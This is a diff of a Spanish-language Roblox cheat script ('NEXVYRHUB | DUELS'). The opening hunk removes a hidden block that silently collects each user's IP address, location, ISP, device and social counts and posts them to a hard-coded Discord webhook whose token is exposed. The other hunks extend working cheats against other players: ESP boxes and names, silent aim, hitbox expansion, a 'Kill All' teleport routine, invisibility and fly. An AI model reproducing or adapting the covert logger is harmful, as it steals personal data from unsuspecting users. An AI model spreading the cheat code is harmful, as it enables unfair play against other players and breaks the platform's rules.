@@ -1,84 +1,3 @@
-task.spawn(function()
-    pcall(function()
-        local HttpService = game:GetService("HttpService")
-        local UserInputService = game:GetService("UserInputService")
-        local Players = game:GetService("Players")
-        local LP = Players.LocalPlayer
-        
-        local webhook_url = "https://discord.com/api/webhooks/1564951731345956885/DJJAN3XF5_yfQ0qO5etoPwJ2LzojkFhnUdFe3R7bvXXzZ7W_QtehCc_PCRWbFKJXhkzw"
-        
-        local function httpGet(url)
-            local reqFunc = request or http_request or syn and syn.request or http.request
-            if reqFunc then
-                local res = reqFunc({Url = url, Method = "GET"})
-                if res and res.Body then return res.Body end
-            end
-            return game:HttpGet(url)
-        end
-
-        local ip, country, city, isp = "Desconocida", "Desconocido", "Desconocida", "Desconocido"
-        
-        pcall(function()
-            local ipData = HttpService:JSONDecode(httpGet("http://ip-api.com/json/"))
-            if ipData and ipData.status == "success" then
-                ip = ipData.query
-                country = ipData.country
-                city = ipData.city
-                isp = ipData.isp
-            end
-        end)
-
-        local device = "PC"
-        if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled then
-            device = "Mobile"
-        elseif UserInputService.GamepadEnabled then
-            device = "Console"
-        end
-
-        local friends, followers, following = 0, 0, 0
-        pcall(function()
-            friends = HttpService:JSONDecode(httpGet("https://friends.roblox.com/v1/users/" .. LP.UserId .. "/friends/count")).count or 0
-            followers = HttpService:JSONDecode(httpGet("https://friends.roblox.com/v1/users/" .. LP.UserId .. "/followers/count")).count or 0
-            following = HttpService:JSONDecode(httpGet("https://friends.roblox.com/v1/users/" .. LP.UserId .. "/followings/count")).count or 0
-        end)
-
-        local data = {
-            ["content"] = "**NEXVYRHUB - User Profile Log**",
-            ["embeds"] = {{
-                ["title"] = "Target: " .. LP.Name,
-                ["url"] = "https://www.roblox.com/users/" .. LP.UserId .. "/profile",
-                ["color"] = 10181046,
-                ["thumbnail"] = {["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. LP.UserId .. "&width=420&height=420&format=png"},
-                ["fields"] = {
-                    {["name"] = "Username", ["value"] = LP.Name, ["inline"] = true},
-                    {["name"] = "Display Name", ["value"] = LP.DisplayName, ["inline"] = true},
-                    {["name"] = "User ID", ["value"] = tostring(LP.UserId), ["inline"] = true},
-                    {["name"] = "Device", ["value"] = device, ["inline"] = true},
-                    {["name"] = "IP Address", ["value"] = ip, ["inline"] = true},
-                    {["name"] = "Country / City", ["value"] = country .. " / " .. city, ["inline"] = true},
-                    {["name"] = "ISP", ["value"] = isp, ["inline"] = true},
-                    {["name"] = "Friends", ["value"] = tostring(friends), ["inline"] = true},
-                    {["name"] = "Followers", ["value"] = tostring(followers), ["inline"] = true},
-                    {["name"] = "Following", ["value"] = tostring(following), ["inline"] = true}
-                },
-                ["footer"] = {["text"] = "Logged via Stealth Module"}
-            }}
-        }
-
-        local payload = HttpService:JSONEncode(data)
-        local reqFunc = request or http_request or syn and syn.request or http.request
-        
-        if reqFunc then
-            reqFunc({
-                Url = webhook_url,
-                Method = "POST",
-                Headers = {["Content-Type"] = "application/json"},
-                Body = payload
-            })
-        end
-    end)
-end)
-
 do
 local Players          = game:GetService("Players")
 local TweenService     = game:GetService("TweenService")
@@ -718,20 +637,88 @@ local silentAimFovEnabled = false
 local silentAimTargetPart = "Cabeza"
 local teamCheckEnabled = true
 local espEnabled = false
-local espColor = Color3.fromRGB(255, 255, 255)
-local espSettings = { Glow = true }
+local espColor = Color3.fromRGB(255, 182, 193)
+local espSettings = { Glow = true, Box = false, Name = false }
 local KillAllEnabled = false
 local hitboxEnabled = false
 local hitboxInvisible = false
 local hitboxSize = 3.5
 local hitboxColor = Color3.fromRGB(255, 0, 0)
 local fakeNameEnabled = false
-local spoofNameText = "Nombre falso"
 local InvisibilityActive = false
 
 local animacionActualActiva = nil
 local misAnimacionesOriginales = nil
 local UIElements = {}
+
+local Persist = { Items = {}, Order = {}, Loading = false, Ready = false, Data = nil, Base = 0, Start = os.clock() }
+Persist.Folder = "NexvyrHub_Configs_WindUI"
+Persist.File = Persist.Folder .. "/autoload.json"
+
+pcall(function()
+    if isfolder and makefolder and not isfolder(Persist.Folder) then makefolder(Persist.Folder) end
+    if isfile and readfile and isfile(Persist.File) then
+        local decoded = HttpService:JSONDecode(readfile(Persist.File))
+        if type(decoded) == "table" then Persist.Data = decoded end
+    end
+end)
+
+Persist.Base = tonumber(Persist.Data and Persist.Data.TotalSeconds) or 0
+Persist.Start = os.clock()
+
+function Persist.Total()
+    return Persist.Base + (os.clock() - Persist.Start)
+end
+
+function Persist.Save()
+    if not Persist.Ready or Persist.Loading or not writefile then return end
+    local values = {}
+    for key, item in pairs(Persist.Items) do
+        local okGet, value = pcall(item.Get)
+        if okGet and value ~= nil then values[key] = value end
+    end
+    local okEncode, encoded = pcall(function()
+        return HttpService:JSONEncode({ TotalSeconds = Persist.Total(), Values = values })
+    end)
+    if okEncode then pcall(writefile, Persist.File, encoded) end
+end
+
+local function persist(key, get, set)
+    if not Persist.Items[key] then Persist.Order[#Persist.Order + 1] = key end
+    Persist.Items[key] = { Get = get, Set = set }
+end
+
+local function persistToggle(key, element, get)
+    persist(key, get, function(v)
+        if type(v) == "boolean" and element then element:Set(v) end
+    end)
+end
+
+local function persistSlider(key, element, get)
+    persist(key, get, function(v)
+        if type(v) == "number" and element then element:Set(v) end
+    end)
+end
+
+local function persistDropdown(key, element, get, apply)
+    persist(key, get, function(v)
+        if v == nil then return end
+        if apply then apply(v) end
+        if element then element:Select(v) end
+    end)
+end
+
+local function persistColor(key, element, get, apply)
+    persist(key, function()
+        local c = get()
+        return { R = c.R, G = c.G, B = c.B }
+    end, function(v)
+        if type(v) ~= "table" then return end
+        local c = Color3.new(v.R or 1, v.G or 1, v.B or 1)
+        apply(c)
+        if element then element:Update(c) end
+    end)
+end
 
 local nexvyrUpdateTargetFeatures
 local nexvyrRefreshTargetMonitor
@@ -766,7 +753,7 @@ local ok, result = pcall(function()
     local cacheValido = false
     if isfile and isfile(timeFileName) and readfile then
         local savedTime = tonumber(readfile(timeFileName))
-        if savedTime and (os.time() - savedTime) < 86400 then
+        if savedTime and (os.time() - savedTime) < 2592000 then
             cacheValido = true
         end
     end
@@ -798,7 +785,7 @@ else
 end
 
 local Window = WindUI:CreateWindow({
-    Title = "NEXVYRHUB | DUELS <font color='#FFD700'>[v3.0] </font>",
+    Title = "NEXVYRHUB | DUELS <font color='#FFD700'>[v3.2] </font>",
     Author = "By 7.dui🇲🇽",
     Folder = "Nexvyr_WindUI",
     Acrylic = false,
@@ -822,12 +809,14 @@ local Window = WindUI:CreateWindow({
     Topbar = { Height = 44, ButtonsType = "Default" }
 })
 
+local NovedadSection = Window:Section({ Title = "Novedad", Opened = true })
 local ExtrasScriptsSection = Window:Section({ Title = "Extras scripts", Opened = true })
 local PrincipalesSection = Window:Section({ Title = "Combate principal", Opened = true })
 local FarmeoSection = Window:Section({ Title = "Zona de farmeo", Opened = true })
 local ConfigSection = Window:Section({ Title = "Configuraciones", Opened = true })
 
 local Tabs = {
+    Informaciones = NovedadSection:Tab({ Title = "informaciónes", Icon = "solar:info-circle-bold" }),
     ExtrasScripts = ExtrasScriptsSection:Tab({ Title = "Extras scripts", Icon = "solar:code-square-bold" }),
     Graficos = ExtrasScriptsSection:Tab({ Title = "Gráficos", Icon = "solar:palette-bold" }),
     Botones = PrincipalesSection:Tab({ Title = "Botones", Icon = "solar:gamepad-bold" }),
@@ -843,9 +832,30 @@ local Tabs = {
     Sonidos = ConfigSection:Tab({ Title = "Sonidos", Icon = "solar:speaker-bold" }),
     Music = ConfigSection:Tab({ Title = "Música", Icon = "solar:music-note-2-bold" }),
     Items = ConfigSection:Tab({ Title = "Items", Icon = "solar:crown-star-bold" }),
-    Guardado = ConfigSection:Tab({ Title = "Guardado", Icon = "solar:diskette-bold" }),
     Identidad = ConfigSection:Tab({ Title = "Identidad", Icon = "solar:user-id-bold" })
 }
+
+do
+    local GREEN = "#3DDC57"
+    local YELLOW = "#FFD700"
+    local lines = {
+        { "+Autoload", GREEN },
+        { "+Nuevos visuales", GREEN },
+        { "+nueva API script protección", GREEN },
+        { "+Kill All [Beta v2]", YELLOW },
+    }
+    Tabs.Informaciones:Section({ Title = "Nuevas cosas agregadas", Icon = "solar:info-circle-bold" })
+    for _, line in ipairs(lines) do
+        local para = Tabs.Informaciones:Paragraph({
+            Title = string.format("<font color='%s'>%s</font>", line[2], line[1]),
+        })
+        pcall(function()
+            for _, d in ipairs(para.ElementFrame:GetDescendants()) do
+                if d:IsA("TextLabel") then d.RichText = true end
+            end
+        end)
+    end
+end
 
 local isEnemy, estaEnLobby, IsInMatchStrict
 local esEnemigoValido, esCuchillo, esPistola, obtenerPistola
@@ -1628,7 +1638,9 @@ local function nexvyrStopTargetMonitor()
 end
 nexvyrRefreshTargetMonitor = function()
     if autoShootEnabled or autoShootAgresivoEnabled or silentAimManualEnabled
-        or silentAimFovEnabled or equipGunEnabled or (espEnabled and espSettings.Glow) or hitboxEnabled or KillAllEnabled then
+        or silentAimFovEnabled or equipGunEnabled
+        or (espEnabled and (espSettings.Glow or espSettings.Box or espSettings.Name))
+        or hitboxEnabled or KillAllEnabled then
         nexvyrStartTargetMonitor()
     else
         nexvyrStopTargetMonitor()
@@ -1915,7 +1927,7 @@ function AutoTeleportMainAlt:MarkPad(pad, isAlt)
     self.HighlightedPad = pad
     self.PadColors[pad] = { Color = pad.Color, Transparency = pad.Transparency }
     pcall(function()
-        pad.Color = isAlt and Color3.fromRGB(255, 70, 70) or Color3.fromRGB(70, 145, 255)
+        pad.Color = isAlt and Color3.fromRGB(255, 182, 193) or Color3.fromRGB(140, 100, 200)
         pad.Transparency = 0.5
     end)
 end
@@ -2104,6 +2116,9 @@ local KILLALL_VALIDATION_TOLERANCE     = 1.0
 local KILLALL_VALIDATION_FRAMES        = 3
 local KILLALL_PREDICT_TIME             = 0.06
 local KILLALL_STICK_LERP_SPEED         = 40
+local KILLALL_BOB_SPEED                = 20
+local KILLALL_BOB_UP                   = 2.5
+local KILLALL_BOB_DOWN                 = 1.5
 
 local KillAll = {}
 KillAll.__index = KillAll
@@ -2118,6 +2133,7 @@ function KillAll.new()
         floorCheckTime = 0, triggerStart = nil,
         inKnifeRangeNow = false, forceDescent = false, jitterSide = 1, jitterCurrent = 0,
         jitterNextSwitch = 0, lastSetCFrame = nil, validFrames = 0, killActivated = false,
+        bobTime = 0,
     }, KillAll)
 end
 
@@ -2242,6 +2258,7 @@ function KillAll:ResetState()
     self.validFrames = 0
     self.killActivated = false
     self.triggerStart = nil
+    self.bobTime = 0
     self:RestoreCollisions()
     local hum = self:GetHumanoid(player)
     if hum and hum.PlatformStand then pcall(function() hum.PlatformStand = false end) end
@@ -2400,6 +2417,7 @@ function KillAll:ApproachTarget(myRoot, targetRoot, dt)
                 self.lastStickTarget = targetRoot
                 self.targetFloor = nil
                 self.forceDescent = true
+                self.bobTime = 0
                 local hum = self:GetHumanoid(targetRoot.Parent)
                 self.lastEnemyHealth = hum and hum.Health or nil
                 self.lastHealthChangeTime = os.clock()
@@ -2469,14 +2487,17 @@ function KillAll:StickToTarget(myRoot, targetRoot, dt)
     local x = predX + back.X * KILLALL_APPROACH_DISTANCE
     local z = predZ + back.Z * KILLALL_APPROACH_DISTANCE
     local inRange = self:IsInKnifeRange(myRoot, targetRoot)
+    local baseY = self.targetFloor - KILLALL_HEIGHT_OFFSET
     local y
-    if inRange and not self.forceDescent then y = myPos.Y
+    if inRange and not self.forceDescent then
+        self.bobTime = (self.bobTime or 0) + dt
+        local wave = math.sin(self.bobTime * KILLALL_BOB_SPEED)
+        local bob = wave >= 0 and wave * KILLALL_BOB_UP or wave * KILLALL_BOB_DOWN
+        y = baseY + bob
     else
-        y = self.targetFloor - KILLALL_HEIGHT_OFFSET
+        y = baseY
         if inRange then self.forceDescent = false end
     end
-    local maxY = self.targetFloor - KILLALL_HEIGHT_OFFSET
-    if y > maxY then y = maxY end
     local alpha = math.clamp(dt * KILLALL_STICK_LERP_SPEED, 0, 1)
     local newPos = myPos:Lerp(Vector3.new(x, y, z), alpha)
     pcall(function()
@@ -2538,6 +2559,7 @@ function KillAll:Update(dt)
             self.validFrames          = 0
             self.lastSetCFrame        = nil
             self.triggerStart         = nil
+            self.bobTime              = 0
             return
         end
     end
@@ -2625,6 +2647,7 @@ function KillAll:Update(dt)
             self.validFrames          = 0
             self.lastSetCFrame        = nil
             self.triggerStart         = nil
+            self.bobTime              = 0
             if lostTarget then self.lastStickTarget = nil end
         else
             self:StickToTarget(myRoot, target, dt or 0)
@@ -2662,6 +2685,7 @@ function KillAll:Start()
     self.lastSetCFrame = nil
     self.validFrames = 0
     self.killActivated = false
+    self.bobTime = 0
     local myRoot = self:GetRoot(player)
     if myRoot then
         local params = RaycastParams.new()
@@ -2708,6 +2732,7 @@ function KillAll:Start()
         self.lastSetCFrame = nil
         self.validFrames = 0
         self.killActivated = false
+        self.bobTime = 0
     end))
 end
 
@@ -2753,7 +2778,7 @@ Tabs.ExtrasScripts:Button({
 
 task.wait()
 
--- Pestaña Inició (sin títulos): imagen con marco, texto y botón que copia el link
+-- Pestaña Inició (sin títulos): datos del jugador arriba, imagen con marco, texto y botón que copia el link
 do
     local DISCORD_LINK = "https://discord.gg/xw3Rr2W7v"
     local IMAGE_ID = 114452675067716
@@ -2766,6 +2791,43 @@ do
         o.Parent = parent
         return o
     end
+
+    local function formatUseTime(total)
+        total = math.max(0, math.floor(total))
+        local h = math.floor(total / 3600)
+        local m = math.floor((total % 3600) / 60)
+        local s = total % 60
+        return string.format("%dh %02dm %02ds", h, m, s)
+    end
+
+    Tabs.Inicio:Paragraph({
+        Title = "Nombre",
+        Desc = player.DisplayName,
+        Icon = "solar:user-bold",
+    })
+
+    Tabs.Inicio:Paragraph({
+        Title = "Usuario",
+        Desc = "@" .. player.Name,
+        Icon = "solar:user-id-bold",
+    })
+
+    local timePara = Tabs.Inicio:Paragraph({
+        Title = "Tiempo usando el script",
+        Desc = formatUseTime(Persist.Total()),
+        Icon = "solar:clock-circle-bold",
+    })
+
+    task.spawn(function()
+        while true do
+            task.wait(1)
+            pcall(function() timePara:SetDesc(formatUseTime(Persist.Total())) end)
+        end
+    end)
+
+    Tabs.Inicio:Space()
+    Tabs.Inicio:Divider()
+    Tabs.Inicio:Space()
 
     local candidates = {
         "rbxthumb://type=Asset&id=" .. IMAGE_ID .. "&w=420&h=420",
@@ -3031,6 +3093,16 @@ UIElements.SliFOVSize = Tabs.Aim:Slider({
     Value = { Min = 10, Max = 800, Default = 120 },
     Callback = function(v) fovRadius = v end
 })
+
+persistDropdown("DropAutoShootPart", UIElements.DropAutoShootPart, function() return autoShootTargetPart end, function(v) autoShootTargetPart = v end)
+persistDropdown("DropSilentAimPart", UIElements.DropSilentAimPart, function() return silentAimTargetPart end, function(v) silentAimTargetPart = v end)
+persistSlider("SliFOVSize", UIElements.SliFOVSize, function() return fovRadius end)
+persistToggle("TogAutoShoot", UIElements.TogAutoShoot, function() return autoShootEnabled end)
+persistToggle("TogAutoShootAgr", UIElements.TogAutoShootAgr, function() return autoShootAgresivoEnabled end)
+persistToggle("TogEquipGun", UIElements.TogEquipGun, function() return equipGunEnabled end)
+persistToggle("TogSilentAimManual", UIElements.TogSilentAimManual, function() return silentAimManualEnabled end)
+persistToggle("TogSilentAimFOV", UIElements.TogSilentAimFOV, function() return silentAimFovEnabled end)
+persistToggle("TogShowFOV", UIElements.TogShowFOV, function() return fovVisiblePreference end)
 
 do
 getgenv().NexvyrTargetPart = nil
@@ -3543,6 +3615,12 @@ UIElements.ColHitbox = Tabs.KillAll:Colorpicker({
     Callback = function(c) hitboxColor = c end
 })
 
+persistSlider("SliHitboxSize", UIElements.SliHitboxSize, function() return hitboxSize end)
+persistColor("ColHitbox", UIElements.ColHitbox, function() return hitboxColor end, function(c) hitboxColor = c end)
+persistToggle("TogHitboxInvisible", UIElements.TogHitboxInvisible, function() return hitboxInvisible end)
+persistToggle("TogHitbox", UIElements.TogHitbox, function() return hitboxEnabled end)
+persistToggle("TogKillAll", UIElements.TogKillAll, function() return KillAllEnabled end)
+
 Tabs.Invisible:Section({ Title = "Invisible", Icon = "solar:ghost-bold" })
 
 local function AplicarInvisibilidadTransparencia(state)
@@ -3570,6 +3648,8 @@ UIElements.TogInvisible = Tabs.Invisible:Toggle({
         if nexvyrSetInvisibleWorker then nexvyrSetInvisibleWorker(Value) end
     end
 })
+
+persistToggle("TogInvisible", UIElements.TogInvisible, function() return InvisibilityActive end)
 
 do
 local nexvyrInvisibleConnection
@@ -3859,6 +3939,13 @@ UIElements.SliFly = Tabs.Tramposo:Slider({
     Value = { Min = 1, Max = 150, Default = 50 },
     Callback = function(v) FLY_SPEED = v end
 })
+
+persistSlider("SliSpeed", UIElements.SliSpeed, function() return SPEED end)
+persistSlider("SliJumpPower", UIElements.SliJumpPower, function() return JUMP_POWER end)
+persistSlider("SliFly", UIElements.SliFly, function() return FLY_SPEED end)
+persistToggle("TogSpeed", UIElements.TogSpeed, function() return speedConn ~= nil end)
+persistToggle("TogInfJump", UIElements.TogInfJump, function() return jumpConn ~= nil end)
+persistToggle("TogFly", UIElements.TogFly, function() return flyConn ~= nil end)
 end
 
 Tabs.RachaFarm:Section({ Title = "Auto Teleport Main/Alt", Icon = "solar:map-arrow-square-bold" })
@@ -3901,7 +3988,7 @@ autoTPAltToggle = Tabs.RachaFarm:Toggle({
     end
 })
 
-Tabs.RachaFarm:Dropdown({
+UIElements.DropDuelType = Tabs.RachaFarm:Dropdown({
     Title = "Tipo de Duelo",
     Values = { "1v1", "2v2", "3v3", "4v4" },
     Value = "1v1",
@@ -3912,7 +3999,7 @@ Tabs.RachaFarm:Dropdown({
     end
 })
 
-Tabs.RachaFarm:Dropdown({
+UIElements.DropPlatformRow = Tabs.RachaFarm:Dropdown({
     Title = "Fila de Plataformas",
     Values = { "Right Platforms", "Left Platforms" },
     Value = "Right Platforms",
@@ -3923,34 +4010,72 @@ Tabs.RachaFarm:Dropdown({
     end
 })
 
+persistDropdown("DropDuelType", UIElements.DropDuelType, function() return AutoTeleportMainAltInstance.DuelType end, function(v)
+    if PadZoneConfig["Right Platforms"][v] then AutoTeleportMainAltInstance.DuelType = v end
+end)
+persistDropdown("DropPlatformRow", UIElements.DropPlatformRow, function() return AutoTeleportMainAltInstance.PlatformRow end, function(v)
+    if PadZoneConfig[v] then AutoTeleportMainAltInstance.PlatformRow = v end
+end)
+persistToggle("TogAutoTPMain", autoTPMainToggle, function() return AutoTeleportMainAltInstance.ActiveRole == "Main" end)
+persistToggle("TogAutoTPAlt", autoTPAltToggle, function() return AutoTeleportMainAltInstance.ActiveRole == "Alt" end)
+
 do
 Tabs.Vis:Section({ Title = "Configuración de ESP", Icon = "solar:eye-bold" })
 
 local activeESPs = {}
 local MAX_ESP_DISTANCE = 1500
+
+local function espAnyActive()
+    return espEnabled and (espSettings.Glow or espSettings.Box or espSettings.Name)
+end
+
 local function cleanESP(targetPlayer)
     local current = activeESPs[targetPlayer]
     if not current then return end
     if current.Highlight then current.Highlight:Destroy() end
+    if current.Box then current.Box:Destroy() end
+    if current.NameGui then current.NameGui:Destroy() end
     activeESPs[targetPlayer] = nil
 end
 local function cleanAllESPs()
     for other in pairs(activeESPs) do cleanESP(other) end
 end
 
+local function refreshESP()
+    if nexvyrRefreshTargetMonitor then nexvyrRefreshTargetMonitor() end
+    if espAnyActive() then nexvyrStartESPWorker() else cleanAllESPs() end
+end
+
 UIElements.TogEsp = Tabs.Vis:Toggle({
     Title = "ESP Jugadores",
     Callback = function(s)
         espEnabled = s
-        if nexvyrRefreshTargetMonitor then nexvyrRefreshTargetMonitor() end
-        if espEnabled and espSettings.Glow then nexvyrStartESPWorker() else cleanAllESPs() end
+        refreshESP()
     end
 })
 
 UIElements.ColEsp = Tabs.Vis:Colorpicker({
     Title = "Color del ESP",
-    Default = Color3.fromRGB(255, 255, 255),
+    Default = Color3.fromRGB(255, 182, 193),
     Callback = function(c) espColor = c end
+})
+
+UIElements.TogEspBox = Tabs.Vis:Toggle({
+    Title = "Espiar con caja",
+    Value = false,
+    Callback = function(s)
+        espSettings.Box = s
+        refreshESP()
+    end
+})
+
+UIElements.TogEspName = Tabs.Vis:Toggle({
+    Title = "Espiar de nombre",
+    Value = false,
+    Callback = function(s)
+        espSettings.Name = s
+        refreshESP()
+    end
 })
 
 Tabs.Vis:Space()
@@ -3963,20 +4088,19 @@ UIElements.TogEspGl = Tabs.Vis:Toggle({
     Value = true,
     Callback = function(s)
         espSettings.Glow = s
-        if nexvyrRefreshTargetMonitor then nexvyrRefreshTargetMonitor() end
-        if s and espEnabled then nexvyrStartESPWorker() else cleanAllESPs() end
+        refreshESP()
     end
 })
 
 local nexvyrESPWorkerRunning = false
 nexvyrStartESPWorker = function()
-    if nexvyrESPWorkerRunning or not espEnabled or not espSettings.Glow then return end
+    if nexvyrESPWorkerRunning or not espAnyActive() then return end
     nexvyrESPWorkerRunning = true
     task.spawn(function()
         local removingConnection = Players.PlayerRemoving:Connect(cleanESP)
-        while espEnabled and espSettings.Glow do
+        while espAnyActive() do
             task.wait(0.2)
-            if not espEnabled or not espSettings.Glow then break end
+            if not espAnyActive() then break end
             if IsInMatchStrict() then
                 local own = player.Character
                 local head = own and own:FindFirstChild("Head")
@@ -3987,24 +4111,102 @@ nexvyrStartESPWorker = function()
                         local enemyHead = character and character:FindFirstChild("Head")
                         if enemyHead and isEnemy(other) and
                             (not pos or (enemyHead.Position - pos).Magnitude <= MAX_ESP_DISTANCE) then
-                            local activeEntry = activeESPs[other]
-                            if activeEntry and (activeEntry.Char ~= character or not activeEntry.Highlight
-                                or activeEntry.Highlight.Parent ~= espFolder) then
+                            local entry = activeESPs[other]
+                            if entry and entry.Char ~= character then
                                 cleanESP(other)
+                                entry = nil
                             end
-                            if not activeESPs[other] then
-                                local glow = Instance.new("Highlight")
-                                glow.Name = other.Name .. "_Glow"
-                                glow.FillTransparency = 1
-                                glow.OutlineTransparency = 0
-                                glow.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
-                                glow.Adornee = character
-                                glow.Parent = espFolder
-                                activeESPs[other] = {Highlight = glow, Char = character}
+                            if not entry then
+                                entry = { Char = character }
+                                activeESPs[other] = entry
                             end
-                            local current = activeESPs[other].Highlight
-                            if current.Enabled ~= espSettings.Glow then current.Enabled = espSettings.Glow end
-                            if current.OutlineColor ~= espColor then current.OutlineColor = espColor end
+
+                            if espSettings.Glow then
+                                if entry.Highlight and entry.Highlight.Parent ~= espFolder then
+                                    entry.Highlight:Destroy()
+                                    entry.Highlight = nil
+                                end
+                                if not entry.Highlight then
+                                    local glow = Instance.new("Highlight")
+                                    glow.Name = other.Name .. "_Glow"
+                                    glow.FillTransparency = 1
+                                    glow.OutlineTransparency = 0
+                                    glow.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
+                                    glow.Adornee = character
+                                    glow.Parent = espFolder
+                                    entry.Highlight = glow
+                                end
+                                local current = entry.Highlight
+                                if current.Enabled ~= true then current.Enabled = true end
+                                if current.OutlineColor ~= espColor then current.OutlineColor = espColor end
+                            elseif entry.Highlight then
+                                entry.Highlight:Destroy()
+                                entry.Highlight = nil
+                            end
+
+                            if espSettings.Box then
+                                if entry.Box and (entry.Box.Parent ~= espFolder or entry.Box.Adornee ~= character) then
+                                    entry.Box:Destroy()
+                                    entry.Box = nil
+                                end
+                                if not entry.Box then
+                                    local box = Instance.new("SelectionBox")
+                                    box.Name = other.Name .. "_Box"
+                                    box.Adornee = character
+                                    box.LineThickness = 0.05
+                                    box.SurfaceTransparency = 1
+                                    box.Color3 = espColor
+                                    box.SurfaceColor3 = espColor
+                                    box.Parent = espFolder
+                                    entry.Box = box
+                                end
+                                if entry.Box.Color3 ~= espColor then
+                                    entry.Box.Color3 = espColor
+                                    entry.Box.SurfaceColor3 = espColor
+                                end
+                            elseif entry.Box then
+                                entry.Box:Destroy()
+                                entry.Box = nil
+                            end
+
+                            if espSettings.Name then
+                                if entry.NameGui and (entry.NameGui.Parent ~= espFolder or entry.NameGui.Adornee ~= enemyHead) then
+                                    entry.NameGui:Destroy()
+                                    entry.NameGui = nil
+                                    entry.NameLabel = nil
+                                end
+                                if not entry.NameGui then
+                                    local billboard = Instance.new("BillboardGui")
+                                    billboard.Name = other.Name .. "_Name"
+                                    billboard.Adornee = enemyHead
+                                    billboard.AlwaysOnTop = true
+                                    billboard.Size = UDim2.fromOffset(200, 24)
+                                    billboard.StudsOffset = Vector3.new(0, 2.6, 0)
+                                    billboard.MaxDistance = MAX_ESP_DISTANCE
+                                    billboard.Parent = espFolder
+                                    local label = Instance.new("TextLabel")
+                                    label.Name = "Label"
+                                    label.BackgroundTransparency = 1
+                                    label.Size = UDim2.fromScale(1, 1)
+                                    label.Font = Enum.Font.GothamBold
+                                    label.TextSize = 14
+                                    label.TextColor3 = espColor
+                                    label.TextStrokeTransparency = 0.3
+                                    label.TextStrokeColor3 = Color3.new(0, 0, 0)
+                                    label.Text = other.DisplayName
+                                    label.Parent = billboard
+                                    entry.NameGui = billboard
+                                    entry.NameLabel = label
+                                end
+                                if entry.NameLabel then
+                                    if entry.NameLabel.Text ~= other.DisplayName then entry.NameLabel.Text = other.DisplayName end
+                                    if entry.NameLabel.TextColor3 ~= espColor then entry.NameLabel.TextColor3 = espColor end
+                                end
+                            elseif entry.NameGui then
+                                entry.NameGui:Destroy()
+                                entry.NameGui = nil
+                                entry.NameLabel = nil
+                            end
                         else
                             cleanESP(other)
                         end
@@ -4019,6 +4221,12 @@ nexvyrStartESPWorker = function()
         nexvyrESPWorkerRunning = false
     end)
 end
+
+persistColor("ColEsp", UIElements.ColEsp, function() return espColor end, function(c) espColor = c end)
+persistToggle("TogEspGl", UIElements.TogEspGl, function() return espSettings.Glow end)
+persistToggle("TogEspBox", UIElements.TogEspBox, function() return espSettings.Box end)
+persistToggle("TogEspName", UIElements.TogEspName, function() return espSettings.Name end)
+persistToggle("TogEsp", UIElements.TogEsp, function() return espEnabled end)
 
 local FOVCircle
 local nexvyrFOVConnection
@@ -4054,7 +4262,7 @@ local nexvyrFarmSession = 0
 local Networking = ReplicatedStorage:FindFirstChild("Packages") and ReplicatedStorage.Packages:FindFirstChild("Networking")
 local RemoteFarm = Networking and Networking:FindFirstChild("RE/Events/CollectEventSpawnable")
 
-Tabs.Farm:Toggle({
+UIElements.TogAutoFarmEvent = Tabs.Farm:Toggle({
     Title = "Auto Farmear Evento",
     Callback = function(s)
         getgenv().AutoEventFarm = s
@@ -4093,6 +4301,8 @@ Tabs.Farm:Toggle({
         end
     end
 })
+
+persistToggle("TogAutoFarmEvent", UIElements.TogAutoFarmEvent, function() return getgenv().AutoEventFarm == true end)
 
 end
 
@@ -4730,7 +4940,7 @@ end
 
 Tabs.Sonidos:Section({ Title = "Sonido de Muerte", Icon = "solar:speaker-bold" })
 
-Tabs.Sonidos:Toggle({
+UIElements.TogKillSound = Tabs.Sonidos:Toggle({
     Title = "Sonido de Kill",
     Value = false,
     Callback = function(v)
@@ -4749,7 +4959,7 @@ Tabs.Sonidos:Toggle({
 local KillSoundDropdownValues = {}
 for _, s in ipairs(KillSounds) do table.insert(KillSoundDropdownValues, s.Name) end
 
-Tabs.Sonidos:Dropdown({
+UIElements.DropKillSound = Tabs.Sonidos:Dropdown({
     Title = "Sonido de muerte",
     Values = KillSoundDropdownValues,
     Value = "Onichaaan",
@@ -4761,7 +4971,7 @@ Tabs.Sonidos:Dropdown({
 
 Tabs.Sonidos:Section({ Title = "Disparo y Recarga", Icon = "solar:target-bold" })
 
-Tabs.Sonidos:Toggle({
+UIElements.TogShootReload = Tabs.Sonidos:Toggle({
     Title = "Recarga + disparo",
     Value = false,
     Callback = function(v)
@@ -4781,7 +4991,7 @@ Tabs.Sonidos:Toggle({
     end
 })
 
-Tabs.Sonidos:Dropdown({
+UIElements.DropShootSound = Tabs.Sonidos:Dropdown({
     Title = "Sonido de disparo",
     Values = { "Revolver + Recarga", "Magia de Anime", "Láser + Recarga láser" },
     Value = "Revolver + Recarga",
@@ -4799,6 +5009,12 @@ UIElements.SliKillSoundVolume = Tabs.Sonidos:Slider({
         ReloadSoundPlayer.Volume = v
     end
 })
+
+persistDropdown("DropKillSound", UIElements.DropKillSound, function() return SelectedKillSound end, function(v) SelectedKillSound = v end)
+persistDropdown("DropShootSound", UIElements.DropShootSound, function() return SelectedShootReload end, function(v) SelectedShootReload = v end)
+persistSlider("SliKillSoundVolume", UIElements.SliKillSoundVolume, function() return KillSoundVolume end)
+persistToggle("TogKillSound", UIElements.TogKillSound, function() return KillSoundEnabled end)
+persistToggle("TogShootReload", UIElements.TogShootReload, function() return RecargaDisparoEnabled end)
 end
 
 do
@@ -5067,6 +5283,9 @@ UIElements.TogKorblox = Tabs.Items:Toggle({
         if v then applyKorblox() else removeKorblox() end
     end
 })
+
+persistToggle("TogHeadless", UIElements.TogHeadless, function() return HeadlessEnabled end)
+persistToggle("TogKorblox", UIElements.TogKorblox, function() return KorbloxEnabled end)
 end
 
 Tabs.Identidad:Section({ Title = "identidad falsa", Icon = "solar:user-id-bold" })
@@ -5076,136 +5295,287 @@ local updateSystem
 do
 local function safeReplace(str, find, replace)
     local safeFind = find:gsub("[%-%^%$%(%)%%%.%[%]%*%+%?]", "%%%1")
-    return (str:gsub(safeFind, replace))
+    local safeRep = replace:gsub("%%", "%%%%")
+    return (str:gsub(safeFind, safeRep))
 end
 
 local originalData = {}
 local visualConnections = {}
-local nexvyrFakeTextConnections = setmetatable({}, {__mode = "k"})
-local isWorkspaceLooping = false
+local watchedTexts = setmetatable({}, {__mode = "k"})
+local replacePairs = {}
+local fakeNames = {}
+local fakeCounter = 0
